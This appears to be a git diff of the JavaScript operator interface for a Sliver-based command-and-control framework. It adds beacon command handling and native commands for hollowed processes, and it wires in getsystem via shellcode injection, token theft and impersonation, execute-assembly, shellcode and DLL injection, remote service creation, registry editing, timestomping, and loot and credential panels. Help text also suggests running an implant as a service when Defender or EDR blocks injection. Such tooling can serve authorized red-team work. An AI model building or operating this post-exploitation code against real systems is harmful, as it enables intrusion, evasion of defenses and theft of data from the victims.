@@ -1108,7 +1423,10 @@ function tok(s) {
 }
 
 async function runAgentCmd(kind, id, inp, hist) {
-  const raw = inp.value.trim(); if (!raw) return;
+  let raw = inp.value.trim(); if (!raw) return;
+  // features-bundle.js may install an alias expander on window; apply it so
+  // an operator can type `enum` and have it become `execute-assembly …`.
+  if (typeof window.expandAlias === 'function') raw = window.expandAlias(raw);
   hist.unshift(raw); inp.value = '';
   appendOut(id, raw, 'cmd');
   inp.disabled = true;
@@ -1139,17 +1457,36 @@ async function dispatchCmd(kind, id, raw) {
 
   // ── beacons: queue command, then poll for the result (non-blocking) ──
   if (kind === 'beacon') {
+    const _bcn = allBeacons.find(b => b.id === id);
+    if (_bcn && _bcn.isDead) {
+      return appendOut(id, '[!] beacon is DEAD (no recent check-ins). Re-deploy the implant to resume.', 'err');
+    }
+    if (_bcn && _bcn.lastCheckinTs > 0) {
+      const ageSec = Math.floor(Date.now() / 1000) - _bcn.lastCheckinTs;
+      const intSec = (_bcn.interval || 5000000000) / 1e9;
+      if (ageSec > intSec * 5) {
+        appendOut(id, `[!] beacon last checked in ${ageSec}s ago (interval ${intSec}s) - it may be dead. Command queued anyway.`, 'warn');
+      }
+    }
     if (cmd === 'reconfig') {
       if (args.length < 2) return appendOut(id, 'usage: reconfig <interval_sec> <jitter_sec>', 'err');
       await App().ReconfigureBeacon(id, parseInt(args[0]), parseInt(args[1]));
-      return appendOut(id, `[+] reconfigure queued — interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
+      return appendOut(id, `[+] reconfigure queued - interval ${args[0]}s / jitter ${args[1]}s (applies on next check-in)`, 'ok');
     }
     if (cmd === 'interactive') {
       await App().InteractiveBeacon(id);
-      return appendOut(id, '[+] interactive session requested — it will appear as a session on next check-in', 'ok');
+      return appendOut(id, '[+] interactive session requested - it will appear as a session on next check-in', 'ok');
     }
-    const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
-    const r = await App().ExecuteBeaconCommandAsync(id, shellCmd).catch(e => ({ error: String(e) }));
+    // Native gRPC commands bypass cmd.exe shell wrapper (critical for hollowed processes)
+    const _nativeCmds = new Set(['whoami','ps','pwd','cd','ls','netstat','env','ifconfig','screenshot','kill','terminate','rev2self','make-token','impersonate','mkdir']);
+    let r;
+    if (_nativeCmds.has(cmd)) {
+      r = await App().BeaconNativeCommand(id, cmd, args.join(' ')).catch(e => ({ error: String(e) }));
+    } else if (cmd === 'shell') {
+      r = await App().ExecuteBeaconCommandAsync(id, args.join(' ')).catch(e => ({ error: String(e) }));
+    } else {
+      r = await App().ExecuteBeaconCommandAsync(id, raw).catch(e => ({ error: String(e) }));
+    }
     if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
     if (r.status === 'completed') {
       if (r.stdout) appendOut(id, r.stdout.trimEnd(), 'out');
@@ -1157,10 +1494,12 @@ async function dispatchCmd(kind, id, raw) {
       return;
     }
     if (r.taskId) {
-      appendOut(id, `[*] task ${r.taskId.slice(0,8)} queued — polling for result...`, 'pending');
+      pendingBeaconTasks[r.taskId] = { beaconId: id, cmdType: r.cmdType || '' };
+      appendOut(id, `[*] task ${r.taskId.slice(0,8)} queued (${r.cmdType || 'shell'}) - waiting for beacon check-in...`, 'pending');
       pollBeaconResult(id, r.taskId);
     } else {
-      appendOut(id, '[*] command queued — waiting for beacon check-in', 'pending');
+      appendOut(id, '[*] command queued - polling for result...', 'pending');
+      pollBeaconLatest(id);
     }
     return;
   }
@@ -1239,7 +1578,7 @@ async function dispatchCmd(kind, id, raw) {
         }
         return appendOut(id, `[error] ${err}`, 'err');
       }
-      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it — watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) — that returns a SYSTEM session directly.', 'info');
+      return appendOut(id, '[*] getsystem accepted by the teamserver. It builds a NEW shellcode implant and injects it - watch the sessions list for a SYSTEM node in ~1-2 min.\n    If nothing appears, the server-side shellcode build or the injection was blocked (Defender/EDR). Reliable alternative: create a service that runs a generated implant (sc create ... + start) - that returns a SYSTEM session directly.', 'info');
     }
     case 'make-token': {
       if (args.length < 3) return appendOut(id, 'usage: make-token <domain> <username> <password>', 'err');
@@ -1254,7 +1593,7 @@ async function dispatchCmd(kind, id, raw) {
     case 'rev2self': { await App().RevToSelf(id); return appendOut(id, '[+] reverted to self', 'out'); }
     case 'execute-assembly': {
       // execute-assembly <local-path> [assembly args]   (no path = file dialog)
-      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      appendOut(id, args.length ? `[*] running ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
       const r = await App().ExecuteAssembly(id, args[0] || '', args.slice(1).join(' '));
       if (r.error) return appendOut(id, `[error] ${r.error}`, 'err');
       if (r.output && r.output.trim()) return appendOut(id, r.output.trimEnd(), 'out');
@@ -1262,7 +1601,7 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'sideload': {
       // sideload <local-path> [args]   (no path = file dialog)
-      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      appendOut(id, args.length ? `[*] sideloading ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
       const r = await App().Sideload(id, args[0] || '', args.slice(1).join(' '), '');
       return appendOut(id, r.error ? `[error] ${r.error}` : (r.output || '[+] done'), r.error?'err':'out');
     }
@@ -1418,10 +1757,63 @@ async function dispatchCmd(kind, id, raw) {
         const p = await App().RegistryReadHiveExport(id, args[1], args[2]||'');
         return appendOut(id, `[+] hive saved to ${p}`, 'out');
       }
-      return appendOut(id, 'usage: reg query|read|write|read-hive <HIVE> <path> [key] [value]', 'err');
+      if (sub === 'listkeys' || sub === 'list-keys' || sub === 'subkeys') {
+        if (!args[1]) return appendOut(id, 'usage: reg listkeys <HIVE> <path>', 'err');
+        const keys = await App().RegistryListSubKeys(id, args[1], args.slice(2).join(' '));
+        return appendOut(id, (keys || []).join('\n') || '[*] no subkeys', 'out');
+      }
+      if (sub === 'createkey' || sub === 'create-key' || sub === 'mkkey') {
+        if (!args[3]) return appendOut(id, 'usage: reg createkey <HIVE> <path> <key>', 'err');
+        await App().RegistryCreateKey(id, args[1], args[2], args[3]);
+        return appendOut(id, `[+] created key: ${args[3]}`, 'out');
+      }
+      if (sub === 'deletekey' || sub === 'delete-key' || sub === 'rmkey') {
+        if (!args[3]) return appendOut(id, 'usage: reg deletekey <HIVE> <path> <key>', 'err');
+        await App().RegistryDeleteKey(id, args[1], args[2], args[3]);
+        return appendOut(id, `[+] deleted key: ${args[3]}`, 'out');
+      }
+      return appendOut(id, 'usage: reg query|read|write|read-hive|listkeys|createkey|deletekey <HIVE> <path> [key] [value]', 'err');
+    }
+    case 'svc':
+    case 'service': {
+      const sub = (args[0]||'').toLowerCase();
+      if (!sub || sub === 'ls' || sub === 'list') {
+        const list = await App().ListServices(id).catch(e => { appendOut(id, String(e), 'err'); return null; });
+        if (!list) return;
+        let out = 'STATUS      START-TYPE  NAME\n';
+        list.forEach(s => { out += `${(s.status||'').padEnd(12)}${(s.startupMode||'').padEnd(12)}${s.name}\n`; });
+        return appendOut(id, out.trimEnd() || '[*] no services', 'out');
+      }
+      if (sub === 'info' || sub === 'detail') {
+        if (!args[1]) return appendOut(id, 'usage: svc info <name> [hostname]', 'err');
+        const v = await App().ServiceDetail(id, args[2] || '', args[1]).catch(e => { appendOut(id, String(e), 'err'); return null; });
+        if (!v) return;
+        return appendOut(id, JSON.stringify(v, null, 2), 'out');
+      }
+      if (sub === 'start') {
+        if (!args[1]) return appendOut(id, 'usage: svc start <name> [hostname]', 'err');
+        await App().StartServiceByName(id, args[2] || '', args[1]);
+        return appendOut(id, `[+] start requested: ${args[1]}`, 'out');
+      }
+      if (sub === 'stop') {
+        if (!args[1]) return appendOut(id, 'usage: svc stop <name> [hostname]', 'err');
+        await App().StopService(id, args[2] || '', args[1]);
+        return appendOut(id, `[+] stop requested: ${args[1]}`, 'out');
+      }
+      if (sub === 'create' || sub === 'install') {
+        if (!args[2]) return appendOut(id, 'usage: svc create <name> <binPath> [hostname]', 'err');
+        await App().StartService(id, args[3] || '', args[1], args[2]);
+        return appendOut(id, `[+] service '${args[1]}' created`, 'out');
+      }
+      if (sub === 'remove' || sub === 'delete' || sub === 'rm') {
+        if (!args[1]) return appendOut(id, 'usage: svc remove <name> [hostname]', 'err');
+        await App().RemoveService(id, args[2] || '', args[1]);
+        return appendOut(id, `[+] service '${args[1]}' removed`, 'out');
+      }
+      return appendOut(id, 'usage: svc list|info|start|stop|create|remove <name> [hostname]', 'err');
     }
     case 'execute': {
-      // execute [-o|-e|-t|-s ...] <path> [args] — run a program directly (no shell)
+      // execute [-o|-e|-t|-s ...] <path> [args] - run a program directly (no shell)
       const rest = args.filter(a => !a.startsWith('-'));
       if (!rest.length) return appendOut(id, 'usage: execute [-o] <path> [args...]', 'err');
       const r = await App().RunExecute(id, rest[0], rest.slice(1));
@@ -1468,8 +1860,8 @@ async function dispatchCmd(kind, id, raw) {
       const installed = await App().ListInstalledExtensions().catch(() => []);
       const loaded = await App().ListImplantExtensions(id).catch(() => []);
       let out = 'INSTALLED COMMANDS  (run with:  ext <command> [args...])\n';
-      if (!installed.length) out += '  (none installed — use the Sliver CLI: armory install <name>)\n';
-      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  — '+e.help):''}\n`);
+      if (!installed.length) out += '  (none installed - use the Sliver CLI: armory install <name>)\n';
+      installed.forEach(e => out += `  ${(e.command||'').padEnd(20)}${e.isBof?'[BOF] ':'      '}${e.args||''}${e.help?('  - '+e.help):''}\n`);
       out += `\nLOADED IN THIS IMPLANT:  ${loaded && loaded.length ? loaded.join(', ') : '(none yet)'}`;
       return appendOut(id, out, 'out');
     }
@@ -1545,13 +1937,13 @@ async function dispatchCmd(kind, id, raw) {
     }
     case 'execute-shellcode': {
       // execute-shellcode <local-path> [pid]   (no path = file dialog)
-      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      appendOut(id, args.length ? `[*] injecting ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
       const r = await App().ExecuteShellcode(id, args[0] || '', parseInt(args[1])||0);
       return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
     }
     case 'spawndll': {
       // spawndll <local-path> [args]   (no path = file dialog)
-      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given — opening file dialog...', 'pending');
+      appendOut(id, args.length ? `[*] spawning ${args[0]}...` : '[*] no path given - opening file dialog...', 'pending');
       const r = await App().SpawnDll(id, args[0] || '', args.slice(1).join(' '), '');
       return appendOut(id, r.error ? `[error] ${r.error}` : (r.output||'[+] done'), r.error?'err':'out');
     }
@@ -1560,7 +1952,7 @@ async function dispatchCmd(kind, id, raw) {
     case 'chtimes': case 'timestomp': {
       if (args.length < 2) return appendOut(id, 'usage: chtimes <path> <YYYY-MM-DD HH:MM:SS>', 'err');
       const ts = Math.floor(new Date(args.slice(1).join(' ')).getTime()/1000);
-      if (isNaN(ts)) return appendOut(id, 'invalid date — use e.g. 2021-01-01 09:00:00', 'err');
+      if (isNaN(ts)) return appendOut(id, 'invalid date - use e.g. 2021-01-01 09:00:00', 'err');
       await App().Chtimes(id, args[0], ts, ts);
       return appendOut(id, `[+] timestomped ${args[0]} -> ${args.slice(1).join(' ')}`, 'out');
     }
@@ -1681,11 +2073,11 @@ async function dispatchCmd(kind, id, raw) {
       return appendOut(id, r.error ? `[error] ${r.error}` : r.output, r.error?'err':'out');
     }
     default: {
-      // Server/panel commands are not session commands — guide instead of
+      // Server/panel commands are not session commands - guide instead of
       // silently running them in cmd.exe.
       const serverCmds = { sessions:1, beacons:1, jobs:1, listeners:1, generate:1, profiles:1, builds:1, 'implant-builds':1, operators:1, hosts:1, use:1, background:1, players:1, 'new-operator':1 };
       if (serverCmds[cmd]) {
-        return appendOut(id, `[!] '${cmd}' is a server/management command — use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
+        return appendOut(id, `[!] '${cmd}' is a server/management command - use the toolbar at the top (this console runs commands on the target). Type 'help' for session commands, or 'shell ${raw}' to force an OS shell.`, 'err');
       }
       // Otherwise run it in the target's OS shell (cmd.exe / /bin/sh).
       const shellCmd = cmd === 'shell' ? args.join(' ') : raw;
@@ -1701,27 +2093,134 @@ async function dispatchCmd(kind, id, raw) {
 }
 
 // pollBeaconResult polls the beacon task queue until the given task completes,
-// then prints its output. Non-blocking — the console stays usable meanwhile.
-// It uses the task LIST to detect state (reliable), then fetches the full body
-// via GetBeaconTaskResult only once the task is completed.
+// then prints its output. Non-blocking - the console stays usable meanwhile.
+// Two-pronged: checks task list state AND directly fetches result as fallback.
 function pollBeaconResult(id, taskId, tries = 0) {
-  if (!openTabs[id]) return;               // tab closed — stop
-  if (tries > 120) { appendOut(id, `[*] task ${taskId.slice(0,8)} still pending — the beacon has not checked in yet (interval/jitter). Use 'tasks' to check later.`, 'pending'); return; }
+  if (!openTabs[id]) return;
+  if (!pendingBeaconTasks[taskId]) return;
+  const interval = tries < 20 ? 3000 : tries < 60 ? 5000 : 15000;
+  if (tries === 60) appendOut(id, `[*] task ${taskId.slice(0,8)} still pending - slow poll (15s). Result will appear automatically.`, 'pending');
   setTimeout(async () => {
-    const tasks = await App().GetBeaconTasks(id).catch(() => null);
-    if (!tasks) { pollBeaconResult(id, taskId, tries + 1); return; }
-    const t = tasks.find(x => x.id === taskId);
-    if (!t) { pollBeaconResult(id, taskId, tries + 1); return; }
-    if (t.state === 'completed') {
-      const full = await App().GetBeaconTaskResult(taskId).catch(() => null);
-      appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
-      appendOut(id, (((full && full.response) || t.response) || '(no output)').trimEnd(), 'out');
-    } else if (t.state === 'failed' || t.state === 'canceled') {
-      appendOut(id, `[error] task ${t.state}`, 'err');
-    } else {
+    try {
+      if (!openTabs[id]) return;
+      if (!pendingBeaconTasks[taskId]) return;
+
+      let taskListErr = null;
+      const tasks = await App().GetBeaconTasks(id).catch(e => { taskListErr = e; return null; });
+      // Event handler may have raced ahead during the await above and already
+      // fetched+rendered the result. If so, our registry entry is gone — bail.
+      if (!pendingBeaconTasks[taskId]) return;
+      const t = tasks ? tasks.find(x => x.id === taskId) : null;
+      const state = t ? t.state.toLowerCase().trim() : '';
+
+      if (tries > 0 && tries % 10 === 0) {
+        const _bcn = allBeacons.find(b => b.id === id);
+        if (_bcn && _bcn.isDead) {
+          delete pendingBeaconTasks[taskId];
+          appendOut(id, `[!] beacon is DEAD - task ${taskId.slice(0,8)} will not complete. Re-deploy the implant.`, 'err');
+          return;
+        }
+        if (_bcn && _bcn.lastCheckinTs > 0) {
+          const ageSec = Math.floor(Date.now() / 1000) - _bcn.lastCheckinTs;
+          const intSec = (_bcn.interval || 5000000000) / 1e9;
+          if (ageSec > intSec * 10) {
+            delete pendingBeaconTasks[taskId];
+            appendOut(id, `[!] beacon hasn't checked in for ${ageSec}s (interval ${intSec}s) - likely dead. Task ${taskId.slice(0,8)} abandoned.`, 'err');
+            return;
+          }
+        }
+      }
+
+      if (state.includes('complete') || state === 'done') {
+        const _meta = pendingBeaconTasks[taskId];
+        if (!_meta) return; // event handler beat us — already rendered
+        const _cmdType = _meta.cmdType || '';
+        delete pendingBeaconTasks[taskId];
+        let fetchErr = null;
+        const full = _cmdType
+          ? await App().GetBeaconNativeResult(taskId, _cmdType).catch(e => { fetchErr = e; return null; })
+          : await App().GetBeaconTaskResult(taskId).catch(e => { fetchErr = e; return null; });
+        const output = (full && full.response) || (t && t.response) || '';
+        appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
+        if (fetchErr) appendOut(id, `[debug] fetch error: ${fetchErr}`, 'warn');
+        if (_cmdType === 'screenshot' && output.startsWith('data:image')) {
+          appendImg(id, output);
+        } else if (output.trim()) {
+          appendOut(id, output.trimEnd(), 'out');
+        } else {
+          appendOut(id, `[debug] empty response — cmdType=${_cmdType} task summary desc="${t ? t.description : 'n/a'}"`, 'warn');
+        }
+        return;
+      }
+      if (state.includes('fail') || state.includes('cancel')) {
+        delete pendingBeaconTasks[taskId];
+        appendOut(id, `[error] task ${taskId.slice(0,8)} ${state}`, 'err');
+        return;
+      }
+      // Direct fetch every 10 tries as fallback
+      if (tries > 0 && tries % 10 === 0) {
+        const _m2 = pendingBeaconTasks[taskId];
+        if (!_m2) return; // event handler already rendered
+        const _ct2 = _m2.cmdType || '';
+        const direct = _ct2
+          ? await App().GetBeaconNativeResult(taskId, _ct2).catch(() => null)
+          : await App().GetBeaconTaskResult(taskId).catch(() => null);
+        // Re-check after await — the event handler could have raced in.
+        if (!pendingBeaconTasks[taskId]) return;
+        if (direct && direct.response && direct.response.trim()) {
+          delete pendingBeaconTasks[taskId];
+          appendOut(id, `[+] task ${taskId.slice(0,8)} completed`, 'ok');
+          if (_ct2 === 'screenshot' && direct.response.startsWith('data:image')) {
+            appendImg(id, direct.response);
+          } else {
+            appendOut(id, direct.response.trimEnd(), 'out');
+          }
+          return;
+        }
+      }
+      if (tries >= 200) {
+        delete pendingBeaconTasks[taskId];
+        appendOut(id, `[error] task ${taskId.slice(0,8)} timed out after 200 polls`, 'err');
+        return;
+      }
       pollBeaconResult(id, taskId, tries + 1);
+    } catch (e) {
+      appendOut(id, `[debug] poll exception: ${e}`, 'pending');
+      if (tries < 200) pollBeaconResult(id, taskId, tries + 1);
     }
-  }, 3000);
+  }, interval);
+}
+
+// pollBeaconLatest - fallback when no task ID was returned. Watches ALL tasks
+// for the beacon and prints the first newly-completed one it finds.
+function pollBeaconLatest(id, tries = 0, seenIds = null) {
+  if (!openTabs[id]) return;
+  const interval = tries < 20 ? 2000 : tries < 60 ? 5000 : 15000;
+  setTimeout(async () => {
+    try {
+      if (!openTabs[id]) return;
+      const tasks = await App().GetBeaconTasks(id).catch(() => null);
+      if (!tasks || !tasks.length) { pollBeaconLatest(id, tries + 1, seenIds); return; }
+      // First call: snapshot existing task IDs so we only react to new completions
+      if (!seenIds) {
+        seenIds = new Set(tasks.filter(t => t.state === 'completed').map(t => t.id));
+        pollBeaconLatest(id, tries + 1, seenIds);
+        return;
+      }
+      for (const t of tasks) {
+        if (t.state === 'completed' && !seenIds.has(t.id)) {
+          const full = await App().GetBeaconTaskResult(t.id).catch(() => null);
+          const output = (full && full.response) || t.response || '';
+          appendOut(id, `[+] task ${t.id.slice(0,8)} completed`, 'ok');
+          appendOut(id, output.trimEnd() || '(no output)', 'out');
+          return;
+        }
+      }
+      if (tries < 200) pollBeaconLatest(id, tries + 1, seenIds);
+    } catch (e) {
+      if (tries < 200) pollBeaconLatest(id, tries + 1, seenIds);
+    }
+  }, interval);
 }
 
 async function showTasks(id) {
@@ -1752,7 +2251,7 @@ function appendOut(id, text, cls) {
 
 // ── Interactive shell (real-time PTY over a tunnel) ─────────────────────────
 // Opens as a pinned docked tab (named by machine), like the per-agent console
-// and server console — not a floating popup.
+// and server console - not a floating popup.
 async function openInteractiveShell(agentId, obj) {
   const host = obj ? (obj.hostname || obj.id.slice(0,8)) : agentId;
   const isWin = obj && (obj.os||'').toLowerCase().includes('windows');
@@ -1779,7 +2278,7 @@ async function openInteractiveShell(agentId, obj) {
   const outId = `sh-out-${tid}`, inId = `sh-in-${tid}`;
   const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${dockId}`;
   panel.innerHTML =
-    `<pre id="${outId}" class="shell-out"><span class="info">[*] interactive shell on ${esc(host)} — type 'exit' or close the tab to end.\n</span></pre>
+    `<pre id="${outId}" class="shell-out"><span class="info">[*] interactive shell on ${esc(host)} - type 'exit' or close the tab to end.\n</span></pre>
      <input id="${inId}" class="shell-in" placeholder="type a command and press Enter…" autocomplete="off" spellcheck="false"/>`;
   document.getElementById('interact-panels').appendChild(panel);
 
@@ -1803,28 +2302,82 @@ async function openInteractiveShell(agentId, obj) {
 function encodeB64(str){ return btoa(unescape(encodeURIComponent(str))); }
 function decodeB64(b64){ return decodeURIComponent(escape(atob(b64))); }
 
-// ── Toolbar nav (views in bottom panel for non-agent views) ────────────────
-document.querySelectorAll('.tb-btn').forEach(btn => {
-  btn.addEventListener('click', () => {
-    const view = btn.dataset.view;
-    document.querySelectorAll('.tb-btn').forEach(b => b.classList.remove('active'));
-    btn.classList.add('active');
-    if (view === 'sessions' || view === 'beacons') { hideModal(); refreshAgents(); return; }
-    if (view === 'listeners') openListenersPanel();
-    if (view === 'generate') openGeneratePanel();
-    if (view === 'builds') openBuildsPanel();
-    if (view === 'profiles') openProfilesPanel();
-    if (view === 'events') openEventsPanel();
-    if (view === 'loot') openLootPanel();
-    if (view === 'creds') openCredsPanel();
-    if (view === 'hosts') openHostsPanel();
-    if (view === 'operators') openOperatorsPanel();
-    if (view === 'scripts') openScriptsPanel();
-    if (view === 'iocs') openIOCPanel();
-    if (view === 'report') exportReport();
-    if (view === 'c2profiles') openC2ProfileEditor();
-  });
+// ── Toolbar nav ────────────────────────────────────────────────────────────
+// The old flat row of .tb-btn is replaced by grouped dropdown menus. Every
+// menu item still carries data-view, so a single dispatch function serves
+// both old and new markup - makes it easy to link a menu item from anywhere
+// in the app (via switchView / .tb-btn / .menu-item) without ceremony.
+function dispatchView(view) {
+  if (!view) return;
+  // Mark the corresponding menu item active - collapse dropdown afterward.
+  document.querySelectorAll('.menu-item.active,.tb-btn.active').forEach(x => x.classList.remove('active'));
+  const active = document.querySelector('.menu-item[data-view="' + view + '"],.tb-btn[data-view="' + view + '"]');
+  if (active) active.classList.add('active');
+  closeAllMenus();
+  if (view === 'sessions' || view === 'beacons') { hideModal(); refreshAgents(); return; }
+  const routes = {
+    listeners: openListenersPanel, generate: openGeneratePanel, builds: openBuildsPanel,
+    profiles: openProfilesPanel, events: openEventsPanel, loot: openLootPanel,
+    creds: openCredsPanel, hosts: openHostsPanel, operators: openOperatorsPanel,
+    scripts: openScriptsPanel, iocs: openIOCPanel, report: exportReport,
+    c2profiles: openC2ProfileEditor, health: openChainHealthPanel,
+    sleep: openBeaconSleepPanel, gallery: openGalleryPanel,
+    recordings: openRecordingsPanel, watchdog: openWatchdogPanel,
+    settings: openSettingsPanel, import: openImportPanel, websites: openWebsitesPanel,
+  };
+  const fn = routes[view] || window[routes[view]];
+  if (typeof fn === 'function') fn();
+  else toast('warn', 'Unknown view: ' + view);
+}
+// Delegated click handler - one listener catches every current and future
+// menu-item / tb-btn click. Cheaper than rebinding after each panel reopens
+// and dodges the "some items had their listener attached at load time only"
+// class of bug.
+document.addEventListener('click', e => {
+  const el = e.target.closest('.menu-item,.tb-btn');
+  if (!el) return;
+  const view = el.dataset.view;
+  if (view) { dispatchView(view); return; }
+  // Non-view menu items (MITRE panel, shortcuts overlay, palette open) -
+  // handled by their id below.
+  if (el.id === 'menu-mitre')     { closeAllMenus(); (typeof openMitrePanel === 'function') && openMitrePanel(); }
+  if (el.id === 'menu-shortcuts') { closeAllMenus(); (typeof openKbdHelp === 'function') && openKbdHelp(); }
+  if (el.id === 'menu-palette')   { closeAllMenus(); (typeof openPalette === 'function') && openPalette(); }
 });
+
+// Menu-trigger open/close. Click a trigger to toggle its dropdown; click
+// anywhere else to close all. Hover over a different trigger while a menu
+// is open swaps to that menu (CS-style navigation).
+function closeAllMenus() {
+  document.querySelectorAll('.menu-group.open').forEach(g => g.classList.remove('open'));
+}
+document.addEventListener('click', e => {
+  const trigger = e.target.closest('.menu-trigger');
+  if (!trigger) {
+    // Click outside any trigger - close open menus unless the click was
+    // inside a dropdown (that's handled by the delegated .menu-item logic
+    // above which calls closeAllMenus itself).
+    if (!e.target.closest('.menu-dropdown')) closeAllMenus();
+    return;
+  }
+  const group = trigger.parentElement;
+  const wasOpen = group.classList.contains('open');
+  closeAllMenus();
+  if (!wasOpen) group.classList.add('open');
+  e.stopPropagation();
+});
+document.addEventListener('mouseenter', e => {
+  if (!e.target || !e.target.classList) return;
+  const trigger = e.target.classList.contains('menu-trigger') ? e.target : null;
+  if (!trigger) return;
+  const anyOpen = document.querySelector('.menu-group.open');
+  if (!anyOpen) return; // only swap if a menu is already open
+  const group = trigger.parentElement;
+  if (group.classList.contains('open')) return;
+  closeAllMenus();
+  group.classList.add('open');
+}, true);
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeAllMenus(); });
 
 // ── View panels (open in bottom interaction area) ──────────────────────────
 // Config views (Generate, Listeners, Builds, Profiles, Events, Loot, Operators)
@@ -1837,11 +2390,31 @@ function openViewPanel(id, title, content) {
 function hideModal() { document.getElementById('modal-overlay').classList.add('hidden'); }
 document.getElementById('modal-close').addEventListener('click', hideModal);
 
-// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
-// ── Script Manager Panel (Cobalt Strike-style lateral movement / privesc / persistence) ──
+// ── Script Manager Panel (lateral movement / privesc / persistence) ──
+// ── Script Manager Panel (lateral movement / privesc / persistence) ──
 async function openScriptsPanel() {
   const scripts = await App().ListScripts().catch(() => []);
-  const sessions = allSessions.filter(s => s.id);
+  const sessions = (allSessions || []).filter(s => s && s.id && !s.isDead);
+  // Every script needs an interactive session to run against (the "pivot
+  // session" from which the script fans out). Older builds would just show
+  // an empty dropdown and the Preview / Execute buttons would silently
+  // refuse to fire - reading as "Script Manager doesn't work". Now we
+  // show a clear empty state if there are no live sessions.
+  if (!scripts.length) {
+    openViewPanel('scripts', 'Script Manager', `<div class="empty-state">
+      <div class="empty-title">No scripts registered</div>
+      <div class="empty-body">The GUI's built-in script catalogue didn't load. Check that the teamserver connection is healthy - reconnect and try again.</div>
+    </div>`);
+    return;
+  }
+  if (!sessions.length) {
+    openViewPanel('scripts', 'Script Manager', `<div class="empty-state">
+      <div class="empty-title">No live sessions</div>
+      <div class="empty-body">Every recipe here runs against a "pivot" - a live interactive session used to fan out post-exploitation.<br/><br/>Generate a session-mode implant, deploy it, and the Script Manager will fill in.</div>
+      <div class="empty-actions"><button class="btn small" onclick="switchView('generate')">Open Generate</button></div>
+    </div>`);
+    return;
+  }
 
   // Group by category
   const cats = {};
@@ -2190,7 +2763,7 @@ document.getElementById('notes-btn').addEventListener('click', openNotes);
 function openNotes() {
   if (!activeInteractId) return toast('info', 'Open an agent first (double-click a session/beacon)');
   const t = openTabs[activeInteractId], o = t && t.obj;
-  const title = `Notes — ${o ? (o.hostname || o.id.slice(0,8)) : activeInteractId}`;
+  const title = `Notes - ${o ? (o.hostname || o.id.slice(0,8)) : activeInteractId}`;
   openViewPanel('_notes', title,
     `<p style="color:var(--muted);font-size:12px;margin-bottom:8px">Notes are per-agent, saved locally per teamserver, and restored on reconnect. Auto-saved as you type.</p>
      <textarea id="notes-area" class="notes-area" placeholder="Credentials found, next steps, IOCs, todo...">${esc(notesMap[activeInteractId] || '')}</textarea>`);
@@ -2205,7 +2778,7 @@ function markNoted(id) {
 }
 
 // ── Server console (teamserver commands, pinned like the event log) ──────────
-const SERVER_HELP = `Server console — runs teamserver commands (NOT on a target).
+const SERVER_HELP = `Server console - runs teamserver commands (NOT on a target).
   help                     this help
   version                  teamserver version
   sessions                 list sessions
@@ -2264,13 +2837,18 @@ function pinServerConsole() {
   tab.addEventListener('click', e => { if (e.target.dataset.cid) closeTab(e.target.dataset.cid); else activateTab(id); });
   document.getElementById('interact-tabs').appendChild(tab);
   const panel = document.createElement('div'); panel.className = 'interact-panel'; panel.id = `ip-${id}`;
-  panel.innerHTML = `<div class="console-out" id="sc-out"><span class="info">Sliver server console — type 'help'. These commands run on the teamserver.\n</span></div>
+  panel.innerHTML = `<div class="console-out" id="sc-out"><span class="info">Sliver server console - type 'help'. These commands run on the teamserver.\n</span></div>
     <div class="console-in"><span class="console-prompt">sliver &gt; </span><input class="console-input" id="sc-inp" placeholder="server command..." autocomplete="off"/></div>`;
   document.getElementById('interact-panels').appendChild(panel);
   const inp = document.getElementById('sc-inp');
   const hist = []; let hi = -1;
   inp.addEventListener('keydown', e => {
-    if (e.key === 'Enter') { const v = inp.value.trim(); inp.value = ''; hi = -1; if (v) { hist.unshift(v); runServerCmd(v); } }
+    if (e.key === 'Enter') {
+      let v = inp.value.trim(); inp.value = ''; hi = -1;
+      // Apply features-bundle alias expander if installed.
+      if (typeof window.expandAlias === 'function') v = window.expandAlias(v);
+      if (v) { hist.unshift(v); runServerCmd(v); }
+    }
     if (e.key === 'ArrowUp') { if (hi < hist.length-1) { hi++; inp.value = hist[hi]; } e.preventDefault(); }
     if (e.key === 'ArrowDown') { if (hi > 0) { hi--; inp.value = hist[hi]; } else { hi = -1; inp.value = ''; } e.preventDefault(); }
   });
@@ -2499,13 +3077,33 @@ async function openOperatorsPanel() {
 }
 
 function openLootPanel() {
-  openViewPanel('_loot', 'Loot', `<div style="overflow:auto;flex:1" id="loot-list"><div style="padding:10px;color:var(--muted)">Loading...</div></div>`);
-  refreshLootList();
+  openViewPanel('_loot', 'Loot',
+    `<div style="display:flex;flex-direction:column;gap:0;flex:1;min-height:0">
+       <div style="padding:6px 10px;display:flex;gap:8px;align-items:center;border-bottom:1px solid var(--border);background:var(--panel-alt)">
+         <button class="btn small" id="loot-export-all">Export all as ZIP…</button>
+         <button class="btn small" onclick="switchView('gallery')">Screenshot Gallery</button>
+         <span class="spacer" style="flex:1"></span>
+         <span id="loot-count" style="color:var(--muted);font-size:11px"></span>
+       </div>
